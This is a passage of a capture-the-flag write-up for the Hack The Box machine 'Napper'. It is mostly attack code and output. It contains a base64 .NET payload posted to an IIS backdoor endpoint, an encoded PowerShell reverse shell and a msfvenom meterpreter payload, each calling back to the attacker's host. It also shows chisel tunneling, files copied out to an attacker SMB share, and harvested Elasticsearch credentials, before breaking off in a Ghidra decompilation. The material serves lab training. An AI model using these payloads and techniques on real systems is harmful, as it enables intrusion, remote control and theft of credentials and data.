gAAQBGAGkAbABlAFYAZQByAHMAaQBvAG4AAAAAADEALgAwAC4AMAAuADAAAAA4AAwAAQBJAG4AdABlAHIAbgBhAGwATgBhAG0AZQAAAHAAYQB5AGwAbwBhAGQALgBkAGwAbAAAAEgAEgABAEwAZQBnAGEAbABDAG8AcAB5AHIAaQBnAGgAdAAAAEMAbwBwAHkAcgBpAGcAaAB0ACAAqQAgACAAMgAwADIAMwAAACoAAQABAEwAZQBnAGEAbABUAHIAYQBkAGUAbQBhAHIAawBzAAAAAAAAAAAAQAAMAAEATwByAGkAZwBpAG4AYQBsAEYAaQBsAGUAbgBhAG0AZQAAAHAAYQB5AGwAbwBhAGQALgBkAGwAbAAAADAACAABAFAAcgBvAGQAdQBjAHQATgBhAG0AZQAAAAAAcABhAHkAbABvAGEAZAAAADQACAABAFAAcgBvAGQAdQBjAHQAVgBlAHIAcwBpAG8AbgAAADEALgAwAC4AMAAuADAAAAA4AAgAAQBBAHMAcwBlAG0AYgBsAHkAIABWAGUAcgBzAGkAbwBuAAAAMQAuADAALgAwAC4AMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAMAAAAvDgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
form_field = f"sdafwe3rwe23={requests.utils.quote(payload)}"

for h in hosts:
    url_ssl = f"https://{h}/ews/MsExgHealthCheckd/"

    try:
        r_ssl = requests.post(url_ssl, data=form_field, verify=False)
        print(f"{url_ssl} : {r_ssl.status_code} {r_ssl.headers}")
    except KeyboardInterrupt:
        exit()
    except Exception as e:
        print(e)
        pass
```

> https://www.revshells.com/

PowerShell #3 (Base64)

```c
┌──(user㉿kali)-[/media/…/htb/machines/napper/serve]
└─$ cat x.ps1 
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4ANAAyACIALAA5ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
```

```c
┌──(user㉿kali)-[/media/…/htb/machines/napper/serve]
└─$ python3 -m http.server 80
10.129.5.130 - - [12/Nov/2023 10:45:44] "GET /x.ps1 HTTP/1.1" 200 -
```

```c
┌──(user㉿kali)-[~]
└─$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.16.42] from (UNKNOWN) [10.129.5.130] 54029

PS C:\Windows\system32>
```

## user.txt

```c
PS C:\Users\ruben\Desktop> type user.txt
cffa22d0c0dc685fc3f3c75d075ad71b
```

## Enumeration

```c
PS C:\Users\ruben\Desktop> whoami /all

USER INFORMATION
----------------

User Name    SID                                           
============ ==============================================
napper\ruben S-1-5-21-1567175541-2888103920-4161894620-1001


GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes                                        
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\BATCH                   Well-known group S-1-5-3      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                   


PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State   
========================================= ================================================================== ========
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled 
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
SeTimeZonePrivilege                       Change the time zone                                               Disabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled
```

```c
PS C:\Users\ruben\AppData\System32> dir


    Directory: C:\Users\ruben\AppData\System32


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----          6/8/2023   5:35 AM             90 iis.ps1                                                              
-a----        10/27/2023   6:07 AM           7168 iisHelper.exe                                                        
-a----        10/26/2023  12:09 PM           5120 RunA.exe
```

```c
PS C:\Users\ruben\AppData\System32> type iis.ps1
While(1) {
    Start-Process C:\users\Ruben\appdata\System32\iisHelper.exe -Wait
   }
```

```c
C:\Temp\www\internal\content\posts>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is CB08-11BF

 Directory of C:\Temp\www\internal\content\posts

06/08/2023  11:20 PM    <DIR>          .
06/08/2023  11:20 PM    <DIR>          ..
06/08/2023  11:18 PM             1,755 first-re-research.md
06/08/2023  11:28 PM    <DIR>          internal-laps-alpha
06/08/2023  11:18 PM               493 no-more-laps.md
               2 File(s)          2,248 bytes
               3 Dir(s)   2,795,835,392 bytes free
```

```c
C:\Temp\www\internal\content\posts>type no-more-laps.md
type no-more-laps.md
---
title: "**INTERNAL** Getting rid of LAPS"
description: Replacing LAPS with out own custom solution
date: 2023-07-01
draft: true 
tags: [internal, sysadmin] 
---

# Intro

We are getting rid of LAPS in favor of our own custom solution. 
The password for the `backup` user will be stored in the local Elastic DB.

IT will deploy the decryption client to the admin desktops once it it ready. 

We do expect the development to be ready soon. The Malware RE team will be the first test group.
```

```c
PS C:\Temp\www\internal\content\posts\internal-laps-alpha> dir


    Directory: C:\Temp\www\internal\content\posts\internal-laps-alpha


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----          6/9/2023  12:28 AM             82 .env                                                                 
-a----          6/9/2023  12:20 AM       12697088 a.exe
```

```c
PS C:\Temp\www\internal\content\posts\internal-laps-alpha> type .env
ELASTICUSER=user
ELASTICPASS=DumpPassword\$Here

ELASTICURI=https://127.0.0.1:9200
```

| Username | Password |
| --- | --- |
| user | DumpPassword\$Here |

```c
C:\Program Files\elasticsearch-8.8.0\data\indices>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is CB08-11BF

 Directory of C:\Program Files\elasticsearch-8.8.0\data\indices

11/12/2023  04:39 AM    <DIR>          .
11/12/2023  04:39 AM    <DIR>          ..
11/11/2023  11:35 AM    <DIR>          n5Gtg7mtSVOUFiVHo9w-Nw
11/12/2023  04:39 AM    <DIR>          N_YmptBuRbqCFE39zKuEKQ
11/12/2023  04:39 AM    <DIR>          tzax5yv8T9qwgxJpool5ZA
               0 File(s)              0 bytes
               5 Dir(s)   2,792,558,592 bytes free
```

```c
PS C:\Program Files\elasticsearch-8.8.0\data\indices> Get-ChildItem -Recurse -File | Select-String -Pattern "passw"

n5Gtg7mtSVOUFiVHo9w-Nw\0\index\_z8.cfs:21:?metadata":{},"realm":"__attach"Z▒?}}?reserv?5ed-user-elasticI{"pa
ssword":"oKHzjZw0EGcRxT2cux5K","enabled":true,"[?reserved-user"}?

                                                                 ?
                                                                  ?role-user1?{"cluster":["mon
itor"],"indices":[{"names":["seed","user*"],"privileges":["read","monitor","write","index","create_index"],"a
llow_restricted_indices":false}],"applications":[],"run_as":[],"metadata":{},?"type":"role"}?
n5Gtg7mtSVOUFiVHo9w-Nw\0\index\_z8.cfs:23:?user-usper?{"    ?name":"us?er","password":"$2a$?10$DQkbU0Aj6toFW1rDa?ZPA
XesqsniTwdFr0.RWI?.8VveNGjAeSniq/O","r?oles":["?1"],"ful?l_name":null,"email"?:null,"metadata":nul?l,"enabled":tr
ue,"ty?pe":"user"}?(???H?O??lLucene90DocValuesMetadata?~(ZHC?'?
                                                               ??\?v
n5Gtg7mtSVOUFiVHo9w-Nw\0\index\_zb.cfs:22:?metadata":{},"realm":"__attach"Z▒?}}?reserv?5ed-user-elasticI{"pa
ssword":"oKHzjZw0EGcRxT2cux5K","enabled":true,"[?reserved-user"}?

                                                                 ?
                                                                  ?role-user1?{"cluster":["mon
itor"],"indices":[{"names":["seed","user*"],"privileges":["read","monitor","write","index","create_index"],"a
llow_restricted_indices":false}],"applications":[],"run_as":[],"metadata":{},?"type":"role"}?
n5Gtg7mtSVOUFiVHo9w-Nw\0\index\_zb.cfs:24:?user-usper?{"    ?name":"us?er","password":"$2a$?10$QCSndKpdFSvcE6GHO?7c7
busS8PwHtHKRwwmOM?6/6dI4KhI3mS.PCa","r?oles":["?1"],"ful?l_name":null,"email"?:null,"metadata":nul?l,"enabled":tr
ue,"ty?pe":"user"}?(??2?|??lLucene90DocValuesMetadata?~(ZHC?'?
                                                              ??\??
n5Gtg7mtSVOUFiVHo9w-Nw\0\translog\translog-461.tlog:1:??translogYYZn_EMvSLiPTzCTpUoTSQ&?b??
                                                                                                user
-user?{"username":"user","password":"$2a$10$QCSndKpdFSvcE6GHO7c7busS8PwHtHKRwwmOM6/6dI4KhI3mS.PCa","roles":["user1"],"
full_name":null,"email":null,"metadata":null,"enabled":true,"type":"user"}?????????Z&??Z
```

| Username | Password |
| --- | --- |
| elastic | oKHzjZw0EGcRxT2cux5K |

## Persistence

```c
┌──(user㉿kali)-[/media/…/htb/machines/napper/serve]
└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe LHOST=10.10.16.42 LPORT=443 > shell.exe         
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
```

```c
PS C:\tmp> iwr 10.10.16.42/shell.exe -o shell.exe
PS C:\tmp> .\shell.exe
```

```c
┌──(user㉿kali)-[~]
└─$ msfconsole
                                                  
     ,           ,
    /             \
   ((__---,,,---__))
      (_) O O (_)_________
         \ _ /            |\
          o_o \   M S F   | \
               \   _____  |  *
                |||   WW|||
                |||     |||


       =[ metasploit v6.3.31-dev                          ]
+ -- --=[ 2346 exploits - 1220 auxiliary - 413 post       ]
+ -- --=[ 1390 payloads - 46 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Enable HTTP request and response logging 
with set HttpTrace true
Metasploit Documentation: https://docs.metasploit.com/

[*] Starting persistent handler(s)...
msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST tun0
LHOST => tun0
msf6 exploit(multi/handler) > set LPORT 443
LPORT => 443
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.16.42:443 
[*] Sending stage (200774 bytes) to 10.129.5.130
[*] Meterpreter session 1 opened (10.10.16.42:443 -> 10.129.5.130:54037) at 2023-11-12 11:15:08 +0000

meterpreter >
```

```c
meterpreter > arp

ARP cache
=========

    IP address       MAC address        Interface
    ----------       -----------        ---------
    10.129.0.1       00:50:56:b9:74:37  vmxnet3 Ethernet Adapter
    10.129.255.255   ff:ff:ff:ff:ff:ff  vmxnet3 Ethernet Adapter
    224.0.0.22       00:00:00:00:00:00  Software Loopback Interface 1
    224.0.0.22       01:00:5e:00:00:16  vmxnet3 Ethernet Adapter
    224.0.0.251      01:00:5e:00:00:fb  vmxnet3 Ethernet Adapter
    224.0.0.252      01:00:5e:00:00:fc  vmxnet3 Ethernet Adapter
    239.255.255.250  00:00:00:00:00:00  Software Loopback Interface 1
    255.255.255.255  ff:ff:ff:ff:ff:ff  vmxnet3 Ethernet Adapter
```

```c
meterpreter > netstat

Connection list
===============

    Proto  Local address                    Remote address    State        User  Inode  PID/Program name
    -----  -------------                    --------------    -----        ----  -----  ----------------
    tcp    0.0.0.0:80                       0.0.0.0:*         LISTEN       0     0      4/System
    tcp    0.0.0.0:135                      0.0.0.0:*         LISTEN       0     0      896/svchost.exe
    tcp    0.0.0.0:443                      0.0.0.0:*         LISTEN       0     0      4/System
    tcp    0.0.0.0:445                      0.0.0.0:*         LISTEN       0     0      4/System
    tcp    0.0.0.0:5040                     0.0.0.0:*         LISTEN       0     0      2420/svchost.exe
    tcp    0.0.0.0:7680                     0.0.0.0:*         LISTEN       0     0      2988/svchost.exe
    tcp    0.0.0.0:49664                    0.0.0.0:*         LISTEN       0     0      676/lsass.exe
    tcp    0.0.0.0:49665                    0.0.0.0:*         LISTEN       0     0      520/wininit.exe
    tcp    0.0.0.0:49666                    0.0.0.0:*         LISTEN       0     0      1080/svchost.exe
    tcp    0.0.0.0:49667                    0.0.0.0:*         LISTEN       0     0      1620/svchost.exe
    tcp    0.0.0.0:53321                    0.0.0.0:*         LISTEN       0     0      656/services.exe
    tcp    10.129.5.130:139                 0.0.0.0:*         LISTEN       0     0      4/System
    tcp    10.129.5.130:54029               10.10.16.42:9001  ESTABLISHED  0     0      3280/powershell.exe
    tcp    10.129.5.130:54037               10.10.16.42:443   ESTABLISHED  0     0      1120/shell.exe
    tcp    127.0.0.1:9200                   0.0.0.0:*         LISTEN       0     0      5064/java.exe
    tcp    127.0.0.1:9300                   0.0.0.0:*         LISTEN       0     0      5064/java.exe
    tcp6   :::80                            :::*              LISTEN       0     0      4/System
    tcp6   :::135                           :::*              LISTEN       0     0      896/svchost.exe
    tcp6   :::443                           :::*              LISTEN       0     0      4/System
    tcp6   :::445                           :::*              LISTEN       0     0      4/System
    tcp6   :::7680                          :::*              LISTEN       0     0      2988/svchost.exe
    tcp6   :::49664                         :::*              LISTEN       0     0      676/lsass.exe
    tcp6   :::49665                         :::*              LISTEN       0     0      520/wininit.exe
    tcp6   :::49666                         :::*              LISTEN       0     0      1080/svchost.exe
    tcp6   :::49667                         :::*              LISTEN       0     0      1620/svchost.exe
    tcp6   :::53321                         :::*              LISTEN       0     0      656/services.exe
    udp    0.0.0.0:123                      0.0.0.0:*                      0     0      4888/svchost.exe
    udp    0.0.0.0:5050                     0.0.0.0:*                      0     0      2420/svchost.exe
    udp    0.0.0.0:5353                     0.0.0.0:*                      0     0      1956/svchost.exe
    udp    0.0.0.0:5355                     0.0.0.0:*                      0     0      1956/svchost.exe
    udp    10.129.5.130:137                 0.0.0.0:*                      0     0      4/System
    udp    10.129.5.130:138                 0.0.0.0:*                      0     0      4/System
    udp    10.129.5.130:1900                0.0.0.0:*                      0     0      5140/svchost.exe
    udp    10.129.5.130:51472               0.0.0.0:*                      0     0      5140/svchost.exe
    udp    127.0.0.1:1900                   0.0.0.0:*                      0     0      5140/svchost.exe
    udp    127.0.0.1:51473                  0.0.0.0:*                      0     0      5140/svchost.exe
    udp    127.0.0.1:62878                  0.0.0.0:*                      0     0      2668/svchost.exe
    udp6   :::123                           :::*                           0     0      4888/svchost.exe
    udp6   :::5353                          :::*                           0     0      1956/svchost.exe
    udp6   :::5355                          :::*                           0     0      1956/svchost.exe
    udp6   ::1:1900                         :::*                           0     0      5140/svchost.exe
    udp6   ::1:51471                        :::*                           0     0      5140/svchost.exe
    udp6   fe80::f033:6919:c39b:6857:1900   :::*                           0     0      5140/svchost.exe
    udp6   fe80::f033:6919:c39b:6857:51470  :::*                           0     0      5140/svchost.exe
```

There was a lot of stuff running locally.

```c
┌──(user㉿kali)-[/media/…/htb/machines/napper/serve]
└─$ ./chisel_server server -p 9002 -reverse -v
2023/11/12 11:22:51 server: Reverse tunnelling enabled
2023/11/12 11:22:51 server: Fingerprint 41WMccJ0/mwFF3GK9wzks/btM1vkyShf3uT8xSCLK2U=
2023/11/12 11:22:51 server: Listening on http://0.0.0.0:9002
```

```c
PS C:\tmp> ./chisel_client.exe client 10.10.16.42:9002 R:socks
```

For the `Basic Authentication` we needed credentials we found earlier.

> https://127.0.0.1:9200/

| Username | Password |
| --- | --- |
| user | DumpPassword\$Here |

```c
{
  "name" : "NAPPER",
  "cluster_name" : "backupuser",
  "cluster_uuid" : "tWUZG4e8QpWIwT8HmKcBiw",
  "version" : {
    "number" : "8.8.0",
    "build_flavor" : "default",
    "build_type" : "zip",
    "build_hash" : "c01029875a091076ed42cdb3a41c10b1a9a5a20f",
    "build_date" : "2023-05-23T17:16:07.179039820Z",
    "build_snapshot" : false,
    "lucene_version" : "9.6.0",
    "minimum_wire_compatibility_version" : "7.17.0",
    "minimum_index_compatibility_version" : "7.0.0"
  },
  "tagline" : "You Know, for Search"
}

```

```c
PS C:\temp\www\internal\content\posts\internal-laps-alpha> net user backup
User name                    backup
Full Name                    backup
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            11/12/2023 4:49:41 AM
Password expires             Never
Password changeable          11/12/2023 4:49:41 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   6/9/2023 4:27:07 AM

Logon hours allowed          All

Local Group Memberships      *Administrators       
Global Group memberships     *None                 
The command completed successfully.
```

```c
┌──(user㉿kali)-[~]
└─$ curl -u 'user:DumpPassword$Here' -ks "https://127.0.0.1:9020/_search?pretty=true"
{
  "took" : 2,
  "timed_out" : false,
  "_shards" : {
    "total" : 2,
    "successful" : 2,
    "skipped" : 0,
    "failed" : 0
  },
  "hits" : {
    "total" : {
      "value" : 2,
      "relation" : "eq"
    },
    "max_score" : 1.0,
    "hits" : [
      {
        "_index" : "seed",
        "_id" : "1",
        "_score" : 1.0,
        "_source" : {
          "seed" : 24613793
        }
      },
      {
        "_index" : "user-00001",
        "_id" : "NZbRwosBxzMRhKpGxJpm",
        "_score" : 1.0,
        "_source" : {
          "blob" : "KjW-CLNstquzrisLueriMJSfdnRnAobwyjFKzOQqHdW8uAuozNNwqfVPyiW6ifHl8B3YbvvMyQg=",
          "timestamp" : "2023-11-12T01:16:49.1102933-08:00"
        }
      }
    ]
  }
}

````

> https://127.0.0.1:9200/_search?pretty=true

```c
{
  "took" : 221,
  "timed_out" : false,
  "_shards" : {
    "total" : 2,
    "successful" : 2,
    "skipped" : 0,
    "failed" : 0
  },
  "hits" : {
    "total" : {
      "value" : 2,
      "relation" : "eq"
    },
    "max_score" : 1.0,
    "hits" : [
      {
        "_index" : "seed",
        "_id" : "1",
        "_score" : 1.0,
        "_source" : {
          "seed" : 50993830
        }
      },
      {
        "_index" : "user-00001",
        "_id" : "3Nmrw4sBVJtvyU-wjPR8",
        "_score" : 1.0,
        "_source" : {
          "blob" : "HMXTaMf3OAIUYMRPXa8a9uJA-nXENd5Q9Xvgvh8CfYwuSCHQjC7jOVryj_OtP8GFbejD4oi3EFk=",
          "timestamp" : "2023-11-12T05:14:41.6396857-08:00"
        }
      }
    ]
  }
}

```

```c
┌──(user㉿kali)-[/media/…/htb/machines/napper/files]
└─$ sudo impacket-smbserver share . -smb2support
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

```c
C:\Temp\www\internal\content\posts\internal-laps-alpha>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is CB08-11BF

 Directory of C:\Temp\www\internal\content\posts\internal-laps-alpha

06/08/2023  11:28 PM    <DIR>          .
06/08/2023  11:28 PM    <DIR>          ..
06/08/2023  11:28 PM                82 .env
06/08/2023  11:20 PM        12,697,088 a.exe
               2 File(s)     12,697,170 bytes
               2 Dir(s)   2,795,819,008 bytes free

C:\Temp\www\internal\content\posts\internal-laps-alpha>copy * \\10.10.16.42\share\    
copy * \\10.10.16.42\share\
.env
a.exe
        2 file(s) copied.
```

## Reversing the Binary

We opened `Window` > `GolangAnalyzerExtension` in `Ghida`.

Then moved to `m` > `ma` > `main.` > `main.main - (a.exe)`.

```c
/* Name: main.main
   Start: 008703e0
   End: 00870d40 */

void main.main(void)

{
  int extraout_RAX;
  undefined8 extraout_RAX_00;
  int extraout_RAX_01;
  int extraout_RAX_02;
  undefined8 *extraout_RAX_03;
  int extraout_RAX_04;
  int extraout_RAX_05;
  int extraout_RAX_06;
  undefined8 extraout_RAX_07;
  undefined8 extraout_RAX_08;
  int extraout_RAX_09;
  undefined8 extraout_RAX_10;
  undefined8 extraout_RAX_11;
  int extraout_RAX_12;
  undefined8 extraout_RAX_13;
  undefined8 extraout_RAX_14;
  undefined8 extraout_RAX_15;
  undefined8 *extraout_RAX_16;
  undefined8 *extraout_RAX_17;
  undefined8 *puVar1;
  undefined8 extraout_RAX_18;
  undefined8 extraout_RCX;
  undefined8 uVar2;
  undefined8 extraout_RCX_00;
  undefined8 extraout_RCX_01;
  undefined8 extraout_RCX_02;
  undefined8 extraout_RCX_03;
  undefined8 extraout_RCX_04;
  undefined8 extraout_RBX;
  undefined8 extraout_RBX_00;
  undefined8 extraout_RBX_01;
  undefined8 uVar3;
  int extraout_RBX_02;
  undefined8 extraout_RBX_03;
  undefined8 extraout_RBX_04;
  undefined8 extraout_RBX_05;
  undefined8 extraout_RBX_06;
  int extraout_RBX_07;
  undefined8 extraout_RBX_08;
  undefined8 extraout_RBX_09;
  int extraout_RBX_10;
  undefined8 extraout_RSI;
  undefined8 extraout_RSI_00;
  undefined8 extraout_RSI_01;
  undefined8 extraout_RDI;
  int extraout_RDI_00;
  int extraout_RDI_01;
  undefined8 extraout_R8;
  undefined8 extraout_R8_00;
  undefined8 uVar4;
  undefined8 extraout_R9;
  undefined8 extraout_R9_00;
  undefined8 uVar5;
  undefined8 extraout_R10;
  undefined8 extraout_R10_00;
  undefined8 uVar6;
  undefined8 extraout_R11;
  undefined8 extraout_R11_00;
  undefined8 uVar7;
  undefined auVar8 [16];
  undefined8 in_stack_fffffffffffffc08;
  undefined8 in_stack_fffffffffffffc10;
  undefined8 in_stack_fffffffffffffc18;
  undefined8 in_stack_fffffffffffffc20;
  undefined8 in_stack_fffffffffffffc28;
  undefined8 in_stack_fffffffffffffc30;
  undefined8 in_stack_fffffffffffffc38;
  undefined8 in_stack_fffffffffffffc40;
  undefined8 in_stack_fffffffffffffc48;
  undefined8 in_stack_fffffffffffffc50;
  undefined8 in_stack_fffffffffffffc58;
  undefined8 in_stack_fffffffffffffc60;
  undefined8 in_stack_fffffffffffffc68;
  undefined8 in_stack_fffffffffffffc70;
  undefined8 in_stack_fffffffffffffc78;
  undefined8 in_stack_fffffffffffffc80;
  undefined8 in_stack_fffffffffffffc88;
  undefined8 in_stack_fffffffffffffc90;
  undefined8 in_stack_fffffffffffffc98;
  undefined8 in_stack_fffffffffffffca0;
  undefined8 in_stack_fffffffffffffca8;
  undefined8 in_stack_fffffffffffffcb0;
  undefined8 in_stack_fffffffffffffcb8;
  undefined8 in_stack_fffffffffffffcc0;
  undefined8 in_stack_fffffffffffffcc8;
  undefined8 in_stack_fffffffffffffcd0;
  undefined8 in_stack_fffffffffffffcd8;
  undefined8 in_stack_fffffffffffffce0;
  undefined8 in_stack_fffffffffffffce8;
  undefined local_230 [16];
  undefined local_220 [16];
  code *local_210;
  undefined local_208 [16];
  code *local_1f8;
  undefined local_1f0 [16];
  code *local_1e0;
  undefined local_1d8 [16];
  undefined local_1c8 [40];
  char *local_1a0;
  undefined8 local_198;
  char *local_190;
  undefined8 local_188;
  char *local_180;
  undefined8 local_178;
  char *local_170;
  undefined8 local_168;
  uint4 local_160 [4];
  uint4 local_150 [2];
  undefined8 local_148;
  undefined8 local_140;
  runtime.itab *local_58;
  code **local_20;
  code **ppcStack_18;
  code **local_10;
  
                    /* /Users/remco/git/HTB/es_napper.go:80 */
  auVar8 = (undefined  [16])0x0;
  while (&stack0xfffffffffffffc88 <= CURRENT_G.stackguard0) {
                    /* /Users/remco/git/HTB/es_napper.go:80 */
    runtime.morestack_noctxt();
  }
  local_20 = auVar8._0_8_;
  local_10 = auVar8._8_8_;
  ppcStack_18 = local_20;
                    /* /Users/remco/git/HTB/es_napper.go:81 */
  github.com/joho/godotenv.Load(0,0,0);
                    /* /Users/remco/git/HTB/es_napper.go:82 */
  if (extraout_RAX != 0) {
    local_220._8_8_ = &goss_Error_loading_.env_file_a26650;
    local_220._0_8_ = &string___runtime._type;
                    /* /Users/remco/git/HTB/es_napper.go:83 */
    log.Fatal(local_220,1,1);
  }
                    /* /Users/remco/git/HTB/es_napper.go:87 */
  os.Getenv("ELASTICURI",10);
                    /* /Users/remco/git/HTB/es_napper.go:86 */
                    /* /Users/remco/git/HTB/es_napper.go:89 */
  os.Getenv("ELASTICUSER",0xb);
                    /* /Users/remco/git/HTB/es_napper.go:90 */
  os.Getenv("ELASTICPASS",0xb);
                    /* /Users/remco/git/HTB/es_napper.go:91 */
  runtime.newobject(&http.Transport___runtime.structtype);
                    /* /Users/remco/git/HTB/es_napper.go:92 */
  runtime.newobject(&tls.Config___runtime.structtype);
                    /* /Users/remco/git/HTB/es_napper.go:93 */
  *(undefined *)(extraout_RAX_02 + 0xa0) = 1;
                    /* /Users/remco/git/HTB/es_napper.go:92 */
  if (runtime.writeBarrier == 0) {
    *(int *)(extraout_RAX_01 + 0xa0) = extraout_RAX_02;
  }
  else {
    runtime.gcWriteBarrier();
  }
                    /* /Users/remco/git/HTB/es_napper.go:85 */
  runtime.duffzero_0x10_0x140_runtime.duffzero_004663a1(local_160,(uint16)auVar8);
                    /* /Users/remco/git/HTB/es_napper.go:86 */
  runtime.newobject(&[1]string___runtime.arraytype);
  extraout_RAX_03[1] = extraout_RBX;
  if (runtime.writeBarrier == 0) {
    *extraout_RAX_03 = extraout_RAX_00;
    uVar2 = extraout_RAX_00;
    uVar3 = extraout_RBX_00;
    uVar4 = extraout_R8;
    uVar5 = extraout_R9;
    uVar6 = extraout_R10;
    uVar7 = extraout_R11;
  }
  else {
    runtime.gcWriteBarrierCX();
    uVar2 = extraout_RCX;
